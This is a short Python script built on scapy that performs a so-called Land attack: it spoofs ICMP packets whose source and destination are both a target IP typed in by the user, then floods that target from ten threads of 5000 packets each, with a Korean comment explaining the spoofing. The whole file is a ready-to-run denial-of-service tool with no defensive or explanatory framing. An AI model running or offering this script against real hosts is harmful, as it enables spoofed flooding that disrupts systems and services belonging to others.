from scapy.all import IP, ICMP, send
from threading import Thread

def land_attack(ip):
    for x in range(5000):
        seq_num = x * 256 % 65535
        # 출발지와 목적지 IP를 동일하게 설정
        p = IP(src=ip, dst=ip, proto='icmp')/ICMP(seq=seq_num)
        send(p)


ip = input('[*] Enter target IP: ')
threads = []

for i in range(10):
    th = Thread(target=land_attack, args=(ip,))
    th.start()
    threads.append(th)

for th in threads:
    th.join()

print('[*] Land Attack Finished!')
